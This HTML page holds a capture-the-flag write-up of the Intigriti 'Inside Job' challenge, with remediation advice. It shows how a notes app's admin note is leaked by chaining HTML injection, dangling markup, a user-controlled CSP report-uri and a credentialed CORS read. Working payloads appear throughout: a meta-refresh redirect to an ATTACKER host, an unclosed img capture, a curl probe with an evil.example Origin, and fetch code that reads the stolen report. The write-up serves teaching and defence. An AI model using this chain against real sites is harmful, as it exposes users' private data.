@@ -1,0 +1,336 @@
+<!doctype html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Intigriti 0626 · Inside Job — Write-up</title>
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+<link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;500;700&family=Space+Grotesk:wght@500;600;700&display=swap" rel="stylesheet">
+<style>
+  :root{
+    --bg:#080a09;
+    --bg2:#0c100e;
+    --panel:#0e1311;
+    --line:#19211d;
+    --line2:#222d28;
+    --ink:#cbd6ce;
+    --muted:#71857a;
+    --faint:#4d5d54;
+    --p1:#74e08a;      /* green phosphor — primary */
+    --p1-dim:#2f6b41;
+    --p3:#ffb454;      /* amber phosphor — highlight/warn */
+    --p3-dim:#7a5524;
+    --code:#0a0e0c;
+  }
+  *{box-sizing:border-box}
+  html{scroll-behavior:smooth}
+  body{
+    margin:0;background:var(--bg);color:var(--ink);
+    font-family:"JetBrains Mono",ui-monospace,Menlo,Consolas,monospace;
+    font-size:15px;line-height:1.75;-webkit-font-smoothing:antialiased;
+  }
+  body::before{
+    content:"";position:fixed;inset:0;pointer-events:none;z-index:0;opacity:.4;
+    background:
+      linear-gradient(var(--line) 1px,transparent 1px) 0 0/100% 46px,
+      radial-gradient(1200px 600px at 50% -10%,rgba(116,224,138,.05),transparent 70%);
+    -webkit-mask:linear-gradient(#000,transparent 60%);mask:linear-gradient(#000,transparent 60%);
+  }
+  .wrap{max-width:840px;margin:0 auto;padding:0 22px;position:relative;z-index:1}
+  a{color:var(--p1);text-decoration:none;border-bottom:1px solid transparent}
+  a:hover{border-bottom-color:var(--p1)}
+  ::selection{background:rgba(116,224,138,.22)}
+
+  h1,h2,h3,.disp{font-family:"Space Grotesk",sans-serif}
+
+  .bar{border-bottom:1px solid var(--line);padding:13px 0;font-size:13px;color:var(--faint);
+    position:sticky;top:0;background:rgba(8,10,9,.9);backdrop-filter:blur(7px);z-index:9}
+  .bar b{color:var(--p1)}
+  .bar .r{float:right;color:var(--muted)}
+
+  .hero{padding:54px 0 40px}
+  .term{border:1px solid var(--line2);border-radius:11px;overflow:hidden;background:var(--code);
+    box-shadow:0 0 0 1px rgba(0,0,0,.4),0 30px 80px -40px rgba(116,224,138,.25)}
+  .term .tt{display:flex;align-items:center;gap:8px;padding:11px 15px;background:#0c100e;border-bottom:1px solid var(--line)}
+  .term .tt i{width:11px;height:11px;border-radius:50%;display:inline-block}
+  .d1{background:#ff5f57}.d2{background:#febc2e}.d3{background:#28c840}
+  .term .tt span{margin-left:8px;color:var(--faint);font-size:12.5px}
+  .term .body{padding:20px 20px 24px;font-size:13.5px;line-height:1.7;position:relative;overflow:hidden}
+  .term .body::after{
+    content:"";position:absolute;inset:0;pointer-events:none;
+    background:repeating-linear-gradient(180deg,rgba(0,0,0,0) 0 2px,rgba(0,0,0,.18) 2px 3px);opacity:.5}
+  .pr{color:var(--p1)}.cm{color:var(--ink)}.cmt{color:var(--faint)}.ok{color:var(--p1)}.am{color:var(--p3)}
+  .cur{display:inline-block;width:8px;height:15px;background:var(--p1);vertical-align:-2px;margin-left:2px;animation:bl 1.05s steps(1) infinite;box-shadow:0 0 8px var(--p1)}
+  @keyframes bl{50%{opacity:0}}
+
+  .htitle{margin:34px 0 16px}
+  h1{font-size:clamp(30px,5.4vw,46px);line-height:1.1;margin:0;font-weight:700;letter-spacing:-.02em;color:#eafaef}
+  h1 em{font-style:normal;color:var(--p1);text-shadow:0 0 22px rgba(116,224,138,.45)}
+  .tag{color:var(--muted);font-size:15px;max-width:680px;margin:14px 0 0}
+  .chips{display:flex;flex-wrap:wrap;gap:7px;margin-top:22px}
+  .chip{font-size:12px;color:var(--p1);border:1px solid var(--p1-dim);border-radius:5px;padding:3px 9px;background:rgba(116,224,138,.05)}
+  .chip.a{color:var(--p3);border-color:var(--p3-dim);background:rgba(255,180,84,.05)}
+
+  .sec{padding:42px 0;border-top:1px solid var(--line)}
+  .cmd{font-size:13px;color:var(--faint);margin:0 0 18px}
+  .cmd .pr{color:var(--p1)}.cmd .path{color:var(--p3)}
+  .sec h2{font-size:24px;margin:0 0 18px;font-weight:600;letter-spacing:-.01em;color:#eafaef}
+  .sec h3{font-size:17px;margin:30px 0 11px;font-weight:600;color:var(--ink)}
+  .sec h3 .n{color:var(--p1);margin-right:8px}
+  p{margin:0 0 17px}
+  strong{color:#f1fbf4;font-weight:700}
+  em{color:var(--p3);font-style:normal}
+  .muted{color:var(--muted)}
+
+  pre{background:var(--code);border:1px solid var(--line2);border-radius:9px;padding:15px 17px;
+    overflow-x:auto;font-size:13px;line-height:1.6;margin:0 0 17px}
+  pre .lbl{display:block;color:var(--faint);font-size:11px;letter-spacing:.08em;text-transform:uppercase;margin-bottom:9px}
+  pre .g{color:var(--p1)}pre .a{color:var(--p3)}pre .c{color:var(--faint)}
+  p code,li code,td code{background:var(--code);border:1px solid var(--line2);border-radius:4px;padding:1px 6px;font-size:12.5px;color:#a9e6bb}
+
+  table{width:100%;border-collapse:collapse;margin:0 0 17px;font-size:13.5px}
+  th,td{text-align:left;padding:10px 12px;border-bottom:1px solid var(--line);vertical-align:top}
+  th{color:var(--faint);font-weight:500;font-size:11.5px;letter-spacing:.06em;text-transform:uppercase}
+  tbody tr:hover{background:var(--bg2)}
+
+  .box{display:flex;gap:12px;border:1px solid var(--line2);border-radius:9px;padding:14px 16px;margin:0 0 18px;background:var(--panel)}
+  .box .k{flex:0 0 auto;font-weight:700;font-size:13px;width:22px;height:22px;display:grid;place-items:center;border-radius:5px;margin-top:1px}
+  .box.i .k{color:var(--p1);border:1px solid var(--p1-dim);background:rgba(116,224,138,.08)}
+  .box.w{border-color:var(--p3-dim);background:#140f04}
+  .box.w .k{color:var(--p3);border:1px solid var(--p3-dim);background:rgba(255,180,84,.1)}
+  .box p{margin:0;font-size:13.5px}
+
+  .steps{counter-reset:s;list-style:none;padding:0;margin:0}
+  .steps>li{counter-increment:s;position:relative;padding:0 0 20px 50px}
+  .steps>li::before{content:counter(s,decimal-leading-zero);position:absolute;left:0;top:-1px;
+    font-size:13px;color:var(--p1);border:1px solid var(--p1-dim);border-radius:7px;width:34px;height:34px;
+    display:grid;place-items:center;background:var(--panel)}
+  .steps>li:not(:last-child)::after{content:"";position:absolute;left:17px;top:34px;bottom:4px;width:1px;background:var(--line)}
+  .steps h4{margin:1px 0 6px;font-size:15px;font-weight:600;color:var(--ink);font-family:"Space Grotesk",sans-serif}
+  .steps p{margin:0;font-size:13.5px}
+
+  .flow{border:1px solid var(--line2);border-radius:10px;background:var(--bg2);overflow:hidden}
+  .flow .r{display:flex;gap:12px;padding:10px 18px;font-size:13px;border-bottom:1px solid var(--line)}
+  .flow .r:last-child{border-bottom:0}
+  .flow .r .a{color:var(--p1);flex:0 0 auto}
+  .flow .r.win{background:rgba(116,224,138,.07);color:var(--p1);font-weight:500}
+
+  .fix{list-style:none;padding:0;margin:0}
+  .fix>li{position:relative;padding:0 0 18px 34px}
+  .fix>li::before{content:"✓";position:absolute;left:0;top:0;color:var(--p1);font-weight:700;
+    width:22px;height:22px;display:grid;place-items:center;font-size:12px;border:1px solid var(--p1-dim);border-radius:5px;background:var(--panel)}
+  .fix h4{margin:0 0 6px;font-size:15px;font-weight:600;color:var(--ink);font-family:"Space Grotesk",sans-serif}
+  .fix p{margin:0;font-size:13.5px}
+
+  .foot{padding:42px 0 64px;border-top:1px solid var(--line);font-size:13px;color:var(--faint)}
+  .foot .by{color:var(--muted)}
+  .foot .by a{color:var(--p1);font-weight:500}
+  .foot .meta{margin-top:10px;color:var(--faint)}
+
+  @media (max-width:560px){
+    body{font-size:14.5px}
+    .hero{padding:38px 0 30px}
+    .term .body{font-size:12.5px;padding:16px}
+    table{font-size:12.5px}
+  }
+  @media (prefers-reduced-motion:reduce){html{scroll-behavior:auto}.cur{animation:none}}
+</style>
+</head>
+<body>
+
+<div class="bar"><div class="wrap"><b>rajib_mahmud</b> / intigriti-0626 / inside-job<span class="r">jun 2026 · web</span></div></div>
+
+<div class="wrap">
+
+  <div class="hero">
+    <div class="term">
+      <div class="tt"><i class="d1"></i><i class="d2"></i><i class="d3"></i><span>rajib@intigriti — capture.session</span></div>
+      <div class="body">
+<span class="pr">rajib@intigriti</span>:<span class="am">~/0626</span>$ <span class="cm">./exploit --owner admin --capture dangling-img</span><br>
+<span class="cmt">[*] bouncing admin bot via /report → meta-refresh</span><br>
+<span class="cmt">[*] iframing /search as admin (SameSite=None cookie rides along)</span><br>
+<span class="cmt">[*] &lt;img src='/LK…&gt; blocked by default-src 'none' → CSP report stored</span><br>
+<span class="cmt">[*] reading /csp-report/admin cross-origin (CORS + credentials)</span><br>
+<span class="ok">[+] flag recovered →</span> <span class="am">INTIGRITI{019ea42e-f5af-76ea-85d7-7459d17736ce}</span><br>
+<span class="pr">rajib@intigriti</span>:<span class="am">~/0626</span>$ <span class="cur"></span>
+      </div>
+    </div>
+
+    <div class="htitle">
+      <h1>Inside Job — leaking the admin's note through a <em>CSP report oracle</em></h1>
+      <p class="tag">No script ever runs on the target. A strict nonce-based CSP is bypassed by chaining a reflected HTML-injection sink, dangling-markup capture, an attacker-controlled <code>report-uri</code>, and a credentialed cross-origin read.</p>
+      <div class="chips">
+        <span class="chip">Scriptless XSS</span>
+        <span class="chip">Dangling Markup</span>
+        <span class="chip a">CSP Report Oracle</span>
+        <span class="chip">CORS + Credentials</span>
+        <span class="chip a">SameSite=None</span>
+        <span class="chip">Zero Interaction</span>
+      </div>
+    </div>
+  </div>
+
+  <div class="sec">
+    <p class="cmd"><span class="pr">$</span> cat <span class="path">./00-intro.md</span></p>
+    <h2>A notes app you can't XSS the normal way</h2>
+    <p>The June 2026 Intigriti challenge, <strong>“Inside Job”</strong>, is a private-notes application. The objective is to read the <strong>admin's private note</strong> — it holds the flag. The complication: every response ships a strict, per-request <strong>nonce-based CSP</strong>, so the usual <code>&lt;script&gt;</code> / <code>alert()</code> route is dead on arrival.</p>
+    <p>The solution is <strong>scriptless</strong>: not one line of JavaScript executes on the challenge origin. It runs entirely on injected HTML, the browser's own CSP violation reporting, and a credentialed cross-origin read — three small flaws that compose into a full confidentiality breach with zero clicks.</p>
+    <div class="box i"><div class="k">i</div><p>The admin's note contains the reminder <em>“Check CSP reports daily.”</em> That's the author pointing at the intended channel: the CSP report endpoint <strong>is</strong> the exfiltration path.</p></div>
+  </div>
+
+  <div class="sec">
+    <p class="cmd"><span class="pr">$</span> cat <span class="path">./01-recon.md</span></p>
+    <h2>Read the response before touching a payload</h2>
+    <p>The endpoint of interest is <code>GET /search?owner=&lt;o&gt;&amp;q=&lt;q&gt;&amp;description=&lt;d&gt;</code>. The <code>description</code> parameter is reflected <strong>unencoded</strong> into the head:</p>
+    <pre><span class="lbl">reflection · /search</span>&lt;meta name="description" content="Notes search — <span class="g">[description]</span>"&gt;</pre>
+    <p>And the CSP header:</p>
+    <pre><span class="lbl">header · content-security-policy</span>default-src 'none';
+script-src  'nonce-<span class="g">RANDOM</span>';
+style-src   'nonce-<span class="g">RANDOM</span>';
+form-action 'self';  base-uri 'none';
+report-uri  /csp-report/<span class="a">[owner]</span></pre>
+    <p>Two facts decide everything. The <strong>nonce is random per response</strong>, so injected scripts can't run. And the <strong><code>report-uri</code> is built from <code>owner</code></strong> — the attacker chooses where violation reports are stored.</p>
+    <p>One rendering quirk seals it. When <code>q</code> matches no note, the app renders <strong>all</strong> notes (content HTML-escaped — never a literal <code>'</code>), then reflects <code>q</code> <strong>raw</strong>:</p>
+    <pre><span class="lbl">body · no match</span>&lt;article class="note"&gt;&lt;strong&gt;title&lt;/strong&gt;&lt;p&gt;content&lt;/p&gt;&lt;/article&gt;
+...
+&lt;p&gt;<span class="a">[q]</span> not found&lt;/p&gt;</pre>
+    <p>Unencoded reflection at the top, raw reflection at the bottom, and no literal quote in between — the exact shape a dangling-markup capture needs.</p>
+  </div>
+
+  <div class="sec">
+    <p class="cmd"><span class="pr">$</span> cat <span class="path">./02-insight.md</span></p>
+    <h2>Why a strict CSP doesn't save you</h2>
+    <p>Under <code>default-src 'none'; script-src 'nonce-…'</code> it feels like nothing can leave: no inline script, no external load, no fetch to an attacker domain. As an <em>outbound</em> channel from the challenge origin, that holds.</p>
+    <p>But CSP has a side effect: <strong>when it blocks a sub-resource it emits a report containing the <code>blocked-uri</code></strong> — the URL the page tried to load. Force a secret into a URL the browser attempts to fetch, and CSP blocks the fetch while faithfully recording the secret-bearing URL.</p>
+    <p>The reporting feature becomes a <strong>data oracle</strong>. We don't exfiltrate from the challenge origin at all — we get the secret into a <code>blocked-uri</code>, then read the report through a second channel. That second channel is the CORS bug.</p>
+  </div>
+
+  <div class="sec">
+    <p class="cmd"><span class="pr">$</span> cat <span class="path">./03-vulns.md</span></p>
+    <h2>Three flaws — each minor, chained fatal</h2>
+
+    <h3><span class="n">01</span>Reflected HTML injection (scriptless XSS) on <code>/search</code></h3>
+    <pre><span class="lbl">confirm</span>/search?owner=x&amp;q=test&amp;description=<span class="g">"&gt;&lt;b&gt;INJECTED&lt;/b&gt;</span></pre>
+    <p><code>&lt;b&gt;INJECTED&lt;/b&gt;</code> lands raw in <code>&lt;head&gt;</code>. The nonce blocks execution, so it's a <em>scriptless</em> XSS — no JS, arbitrary markup. Two primitives: a CSP-allowed <code>&lt;meta http-equiv="refresh"&gt;</code> (bounce the bot) and an unclosed <code>&lt;img&gt;</code> whose <code>src</code> swallows markup (capture notes).</p>
+
+    <h3><span class="n">02</span>Attacker-controlled CSP <code>report-uri</code></h3>
+    <p>Since <code>report-uri /csp-report/[owner]</code> is built from <code>owner</code>, setting <code>owner=admin</code> routes a violation generated on the admin's page into <code>/csp-report/admin</code> — a bucket we read later.</p>
+
+    <h3><span class="n">03</span>Credentialed CORS + <code>SameSite=None</code></h3>
+    <pre><span class="lbl">curl · /csp-report/admin</span>$ curl -s -D- -H 'Origin: https://evil.example' \
+    https://challenge-0626.intigriti.io/csp-report/admin
+
+access-control-allow-origin: <span class="g">https://evil.example</span>
+access-control-allow-credentials: <span class="g">true</span></pre>
+    <p>It <strong>reflects the request <code>Origin</code></strong> and sets <strong><code>Allow-Credentials: true</code></strong>. With the cookie set <code>Secure; HttpOnly; SameSite=None</code>, any attacker page can <code>fetch(..., {credentials:'include'})</code> and read the admin's reports <em>as the admin</em>.</p>
+  </div>
+
+  <div class="sec">
+    <p class="cmd"><span class="pr">$</span> cat <span class="path">./04-technique.md</span></p>
+    <h2>Dangling-markup capture, step by step</h2>
+    <p>The goal: every note on the admin's page — flag included — inside one URL the browser will try to load. The primitive is <strong>dangling markup</strong>: open an attribute value and never close it, so the parser greedily eats following markup as part of it.</p>
+    <p>We use the two reflections as a pair:</p>
+    <table>
+      <thead><tr><th>Role</th><th>Param</th><th>Value</th></tr></thead>
+      <tbody>
+        <tr><td>Open the unclosed <code>src</code></td><td><code>description</code></td><td><code>"&gt;&lt;img src='/LK</code></td></tr>
+        <tr><td>Close it after all notes</td><td><code>q</code></td><td><code>'</code></td></tr>
+      </tbody>
+    </table>
+    <pre><span class="lbl">rendered · admin iframe</span>&lt;meta name="description" content="Notes search — "&gt;<span class="g">&lt;img src='/LK</span>"&gt;
+  ...
+  &lt;article class="note"&gt;&lt;strong&gt;<span class="a">INTIGRITI{019ea42e-...}</span>&lt;/strong&gt;&lt;/article&gt;
+  ...
+&lt;p&gt;<span class="g">'</span> not found&lt;/p&gt;</pre>
+    <p>The single-quoted <code>src</code> opens at <code>/LK</code>. Note content is escaped with <strong>no literal <code>'</code></strong>, so the attribute runs all the way to the <code>'</code> supplied via <code>q</code> in the “not found” line — swallowing every note into the URL. <code>default-src 'none'</code> blocks the image and fires a report whose <code>blocked-uri</code> now carries the notes.</p>
+    <div class="box w"><div class="k">!</div><p>In <code>blocked-uri</code> the flag is URL-encoded — <code>{</code> → <code>%7B</code>, <code>}</code> → <code>%7D</code>. A naïve <code>INTIGRITI\{…\}</code> regex misses it; decode the report first.</p></div>
+  </div>
+
+  <div class="sec">
+    <p class="cmd"><span class="pr">$</span> cat <span class="path">./05-chain.md</span></p>
+    <h2>Four moves, zero clicks</h2>
+    <p>The capture must run <strong>in the admin's session</strong> (only their page has the flag note), but we can't run JS on the challenge origin — so everything is driven from an attacker page, riding the <code>SameSite=None</code> cookie.</p>
+    <pre><span class="lbl">1 · bounce the bot (CSP-allowed meta refresh, via /report)</span>/search?owner=<span class="g">&lt;you&gt;</span>&amp;q=ZZ&lt;meta http-equiv=refresh content=0;url=https://ATTACKER/#&gt;</pre>
+    <pre><span class="lbl">2 · attacker page iframes /search AS THE ADMIN</span>/search?owner=<span class="a">admin</span>&amp;q=<span class="g">'</span>&amp;description=<span class="g">"&gt;&lt;img src='/LK</span></pre>
+    <pre><span class="lbl">3 · blocked &lt;img&gt; → report at /csp-report/admin</span>blocked-uri: …/LK%22%3E…%3Cstrong%3E<span class="a">INTIGRITI%7B…%7D</span>%3C/strong%3E…</pre>
+    <pre><span class="lbl">4 · read it cross-origin with the admin's cookie</span>fetch('…/csp-report/admin', { <span class="g">credentials:'include'</span> })
+  .then(r =&gt; r.text())
+  .then(t =&gt; {
+    const i = t.indexOf('INTIGRITI');
+    let s = decodeURIComponent(t.substr(i,160).replace(/%(?![0-9A-Fa-f]{2})/g,'%25'));
+    s.match(/INTIGRITI\{[^}]*\}/);   <span class="c">// → INTIGRITI{019ea42e-...}</span>
+  });</pre>
+    <p>No script ran on <code>challenge-0626.intigriti.io</code>. The leak rode entirely on injected HTML, the browser's CSP reporting, and a credentialed cross-origin read.</p>
+  </div>
+
+  <div class="sec">
+    <p class="cmd"><span class="pr">$</span> cat <span class="path">./06-reproduce.md</span></p>
+    <h2>From zero to flag</h2>
+    <ol class="steps">
+      <li><h4>Get a session</h4><p>Register/login a throwaway account (username + password; no email) — only needed to reach <code>/report</code>.</p></li>
+      <li><h4>Confirm the injection</h4><p><code>description="&gt;&lt;b&gt;INJECTED&lt;/b&gt;</code> reflects raw in <code>&lt;head&gt;</code>.</p></li>
+      <li><h4>Confirm the CORS bug</h4><p><code>curl -H 'Origin: https://evil.example' …/csp-report/admin</code> → origin reflected + <code>allow-credentials: true</code>.</p></li>
+      <li><h4>Host the attacker page</h4><p>On any origin you control. A VPS with a public IP is far more reliable than an ephemeral tunnel — the bot must reach it.</p></li>
+      <li><h4>Deliver via /report</h4><p><code>/search?owner=&lt;you&gt;&amp;q=ZZ&lt;meta http-equiv=refresh content=0;url=https://ATTACKER/#&gt;</code> auto-redirects the bot.</p></li>
+      <li><h4>Collect the flag</h4><p>The page iframes <code>/search?owner=admin&amp;q='&amp;description="&gt;&lt;img src='/LK</code>, reads <code>/csp-report/admin</code>, decodes, and exfiltrates <code>INTIGRITI{…}</code>.</p></li>
+    </ol>
+  </div>
+
+  <div class="sec">
+    <p class="cmd"><span class="pr">$</span> cat <span class="path">./07-flow.md</span></p>
+    <h2>What the browser actually does</h2>
+    <div class="flow">
+      <div class="r"><span class="a">→</span><span>Admin bot fetches the <code>/report</code> path, hits the injected <code>&lt;meta refresh&gt;</code></span></div>
+      <div class="r"><span class="a">→</span><span>Bot navigates to the attacker page (SameSite=None cookie still valid)</span></div>
+      <div class="r"><span class="a">→</span><span>Attacker JS iframes <code>/search?owner=admin</code> with the dangling payload</span></div>
+      <div class="r"><span class="a">→</span><span>Unclosed <code>&lt;img src='/LK…&gt;</code> swallows every note into one URL</span></div>
+      <div class="r"><span class="a">→</span><span><code>default-src 'none'</code> blocks the image → report to <code>/csp-report/admin</code></span></div>
+      <div class="r"><span class="a">→</span><span>Attacker <code>fetch(credentials:'include')</code> reads the report cross-origin</span></div>
+      <div class="r win"><span class="a">✓</span><span>blocked-uri decoded → INTIGRITI{019ea42e-f5af-76ea-85d7-7459d17736ce}</span></div>
+    </div>
+    <div class="box i" style="margin-top:18px"><div class="k">i</div><p>A clean capture is unambiguous in the collector: request from the admin bot's IP, <code>HeadlessChrome</code> UA, a <code>referer</code> pointing at the attacker page, and <code>sec-fetch-dest: image</code> / <code>sec-fetch-site: cross-site</code> — proving the scriptless, cross-site leak.</p></div>
+  </div>
+
+  <div class="sec">
+    <p class="cmd"><span class="pr">$</span> cat <span class="path">./08-payloads.md</span></p>
+    <h2>The whole exploit in one table</h2>
+    <table>
+      <thead><tr><th>Step</th><th>Param</th><th>Value</th></tr></thead>
+      <tbody>
+        <tr><td>Bounce bot to attacker page</td><td><code>q</code></td><td><code>ZZ&lt;meta http-equiv=refresh content=0;url=https://ATTACKER/#&gt;</code></td></tr>
+        <tr><td>Dangling-markup capture</td><td><code>description</code></td><td><code>"&gt;&lt;img src='/LK</code></td></tr>
+        <tr><td>Close capture after notes</td><td><code>q</code></td><td><code>'</code></td></tr>
+        <tr><td>Route report to readable bucket</td><td><code>owner</code></td><td><code>admin</code></td></tr>
+        <tr><td>Read it cross-origin</td><td>—</td><td><code>fetch('/csp-report/admin',{credentials:'include'})</code></td></tr>
+      </tbody>
+    </table>
+  </div>
+
+  <div class="sec">
+    <p class="cmd"><span class="pr">$</span> cat <span class="path">./09-remediation.md</span></p>
+    <h2>Break any one link, defeat the chain</h2>
+    <ul class="fix">
+      <li><h4>Encode the reflected input (root cause)</h4><p>HTML-attribute-encode <code>"</code> <code>'</code> <code>&lt;</code> <code>&gt;</code> <code>&amp;</code> in <code>description</code> before it reaches the <code>&lt;meta&gt;</code> attribute, and likewise for the raw <code>q</code> reflection.</p></li>
+      <li><h4>Don't derive <code>report-uri</code> from user input</h4><p>Use a fixed, server-controlled report endpoint and bind reports to the authenticated session server-side — never to a path segment the requester chooses.</p></li>
+      <li><h4>Fix the CORS policy</h4><p>Stop reflecting <code>Origin</code> with <code>Allow-Credentials: true</code>. Make <code>/csp-report/*</code> same-origin and owner-only, or restrict to a trusted allow-list. Never pair a reflected origin with credentials.</p></li>
+      <li><h4>Harden the session cookie</h4><p>Set <code>SameSite=Lax</code> (or <code>Strict</code>) unless cross-site auth is required. With <code>Lax</code>, the credentialed cross-origin read no longer carries the admin's session.</p></li>
+    </ul>
+  </div>
+
+  <div class="sec">
+    <p class="cmd"><span class="pr">$</span> cat <span class="path">./10-conclusion.md</span></p>
+    <h2>Controls compose — so do their failures</h2>
+    <p>A strict, nonce-based CSP stops script <em>execution</em>, but not markup <em>injection</em> — and its own violation reports become a data oracle when a secret can be coerced into a <code>blocked-uri</code>. Pair that with dangling-markup capture (strongest precisely when JS is off the table) and a credentialed CORS read, and a set of individually “minor” findings becomes a zero-click, cross-browser confidentiality breach.</p>
+    <p>Reviewing each control in isolation misses exactly this class of bug. The impact lives in the chain.</p>
+    <p class="muted">Thanks to the Intigriti team for another sharp, well-built challenge.</p>
+  </div>
+
+  <div class="foot">
+    <p class="by">Write-up by <a href="https://app.intigriti.com/researcher/profile/rajib_mahmud">rajib_mahmud</a> · Intigriti researcher · Challenge 0626 — Inside Job</p>
+    <p class="meta">scriptless xss · dangling markup · csp report oracle · cors + credentials · june 2026</p>
+  </div>
+
+</div>
+</body>
+</html>
